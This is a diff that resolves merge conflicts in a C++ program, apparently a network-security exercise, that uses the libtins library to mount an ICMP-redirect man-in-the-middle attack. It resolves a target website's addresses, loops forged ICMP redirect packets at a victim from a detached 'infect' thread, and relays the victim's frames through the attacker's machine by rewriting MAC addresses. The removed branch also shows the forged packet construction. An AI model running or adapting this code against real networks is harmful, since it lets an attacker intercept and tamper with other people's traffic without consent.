@@ -16,21 +16,13 @@
 #include <WS2tcpip.h>
 #include <regex>
 #include<process.h>
-<<<<<<< HEAD
 #include<vector>
-=======
-#include<map>
->>>>>>> 569cc89bab75f3cb8fd66825cf86a9e6db83e5b3
 using namespace std;
 using namespace Tins;
 using std::cout;
 using std::runtime_error;
 using std::endl;
-<<<<<<< HEAD
 std::string URLToAddrStr(std::string addr, vector<string> &IP)
-=======
-std::string URLToAddrStr(std::string addr)
->>>>>>> 569cc89bab75f3cb8fd66825cf86a9e6db83e5b3
 {
 	WSADATA wsadata;
 	WSAStartup(MAKEWORD(1, 1), &wsadata);
@@ -39,21 +31,13 @@ std::string URLToAddrStr(std::string addr)
 	struct sockaddr_in *sin;
 	int *listen_fd;
 	int listen_fd_num = 0;
-<<<<<<< HEAD
 	char buf[80] = { 0x00, };
-=======
-	char buf[80] = {0x00, };
->>>>>>> 569cc89bab75f3cb8fd66825cf86a9e6db83e5b3
 	int i = 0;
 	memset(&hints, 0x00, sizeof(struct addrinfo));
 	hints.ai_flags = AI_PASSIVE;
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
-<<<<<<< HEAD
 	if (getaddrinfo(addr.c_str(), NULL, &hints, &result) != 0)
-=======
-	if (getaddrinfo(addr.c_str(),NULL, &hints, &result) != 0)
->>>>>>> 569cc89bab75f3cb8fd66825cf86a9e6db83e5b3
 	{
 		perror("getaddrinfo");
 		return std::string("");
@@ -64,31 +48,19 @@ std::string URLToAddrStr(std::string addr)
 	}
 	listen_fd = (int *)malloc(sizeof(int)*listen_fd_num);
 	printf("Num %d", listen_fd_num);
-<<<<<<< HEAD
 	for (rp = result; rp != NULL; rp = rp->ai_next)
-=======
-	for (rp = result, i = 0; rp != NULL; rp = rp->ai_next, i++)
->>>>>>> 569cc89bab75f3cb8fd66825cf86a9e6db83e5b3
 	{
 		if (rp->ai_family == AF_INET)
 		{
 			sin = (sockaddr_in *)rp->ai_addr;
 			inet_ntop(rp->ai_family, &sin->sin_addr, buf, sizeof(buf));
 			printf("<bind 정보 %d %d %s>\n", rp->ai_protocol, rp->ai_socktype, buf);
-<<<<<<< HEAD
 			IP.push_back(buf);
 		}
 	}
 
 	WSACleanup();
 	return std::string("true");
-=======
-			return std::string(buf);
-		}
-	}
-	WSACleanup();
-	return std::string("");
->>>>>>> 569cc89bab75f3cb8fd66825cf86a9e6db83e5b3
 }
 
 
@@ -107,12 +79,7 @@ void icmp_redirect(NetworkInterface iface, IPv4Address gw, IPv4Address attack, I
 	uint8_t *data;
 	data = (uint8_t *)malloc(8);
 	memset(data, NULL, 8);
-<<<<<<< HEAD
 	
-=======
-	EthernetII victim_icmp = EthernetII(victim_hw, gw_hw) / IP(victim, gw) / icmp / IP(webip, victim) / RawPDU(data, 8);
-	EthernetII gw_icmp = EthernetII(attack_hw, gw_hw) / IP(attack, gw) / icmp / IP(webip, gw) / RawPDU(data, 8);
->>>>>>> 569cc89bab75f3cb8fd66825cf86a9e6db83e5b3
 	while (true) {
 		for (vector<string>::size_type i = 0; i < ip.size(); i++)
 		{
@@ -123,11 +90,7 @@ void icmp_redirect(NetworkInterface iface, IPv4Address gw, IPv4Address attack, I
 		}
 		
 #ifdef _WIN32
-<<<<<<< HEAD
 		Sleep(300);
-=======
-		Sleep(500);
->>>>>>> 569cc89bab75f3cb8fd66825cf86a9e6db83e5b3
 #else
 		sleep(5);
 #endif
@@ -145,7 +108,6 @@ void relay(PDU *some_pdu, NetworkInterface iface, EthernetII::address_type attac
 			eth->src_addr(attack_hw);
 			eth->dst_addr(gw_hw);
 			some_pdu->send(sender, iface.name());
-<<<<<<< HEAD
 			//cout << "victim -> attack " << endl;
 			//cout << "eth src :" << eth->src_addr() << endl;
 			//cout << "eth dst :" << eth->dst_addr() << endl;
@@ -161,23 +123,6 @@ void relay(PDU *some_pdu, NetworkInterface iface, EthernetII::address_type attac
 			//cout << "eth dst :" << eth->dst_addr() << endl;
 			//cout << "SRC ip :" << ip->src_addr() << endl;
 			//cout << "dst ip :" << ip->dst_addr() << endl;
-=======
-			cout << "victim -> attack " << endl;
-			cout << "eth src :" << eth->src_addr() << endl;
-			cout << "eth dst :" << eth->dst_addr() << endl;
-			cout << "SRC ip :" << ip->src_addr() << endl;
-			cout << "dst ip :" << ip->dst_addr() << endl;
-		}
-		else if ((eth->dst_addr().to_string() == attack_hw.to_string()))
-		{
-			eth->dst_addr(victim_hw);
-			some_pdu->send(sender, iface.name());
-			cout << "web -> attack " << endl;
-			cout << "eth src :" << eth->src_addr() << endl;
-			cout << "eth dst :" << eth->dst_addr() << endl;
-			cout << "SRC ip :" << ip->src_addr() << endl;
-			cout << "dst ip :" << ip->dst_addr() << endl;
->>>>>>> 569cc89bab75f3cb8fd66825cf86a9e6db83e5b3
 		}
 	}
 }
@@ -191,10 +136,7 @@ int main(int argc, char* argv[]) {
 	EthernetII::address_type attack_hw, victim_hw, gw_hw;
 	IPv4Address gw, victim, attack;
 	string url;
-<<<<<<< HEAD
 	vector<string> URL_IP;
-=======
->>>>>>> 569cc89bab75f3cb8fd66825cf86a9e6db83e5b3
 	try {
 		gw = argv[1];
 		attack = argv[2];
@@ -222,18 +164,10 @@ int main(int argc, char* argv[]) {
 		return 3;
 	}
 	try {
-<<<<<<< HEAD
 		
 			URLToAddrStr(url, URL_IP);
 			std::thread infect(icmp_redirect, iface, gw, attack, victim, URL_IP, info);
 			infect.detach();
-=======
-		if (!URLToAddrStr(url).empty())
-		{
-			std::thread infect(icmp_redirect, iface, gw, attack, victim, URLToAddrStr(url), info);
-			infect.detach();
-		}
->>>>>>> 569cc89bab75f3cb8fd66825cf86a9e6db83e5b3
 	}
 	catch (runtime_error& ex) {
 		cout << "Runtime error: " << ex.what() << endl;
@@ -249,7 +183,4 @@ int main(int argc, char* argv[]) {
 	}
 	return 0;
 }
-<<<<<<< HEAD
 
-=======
->>>>>>> 569cc89bab75f3cb8fd66825cf86a9e6db83e5b3
